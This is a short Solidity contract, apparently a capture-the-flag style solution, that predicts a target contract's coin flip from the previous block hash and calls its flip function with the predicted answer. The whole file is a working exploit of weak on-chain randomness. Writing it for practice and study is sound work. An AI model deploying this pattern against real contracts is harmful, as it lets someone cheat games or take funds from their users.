// SPDX-License-Identifier: MIT
pragma solidity >= 0.4.22 < 0.9.0;

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        (bool success,) = target.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
        require(success);
    }
}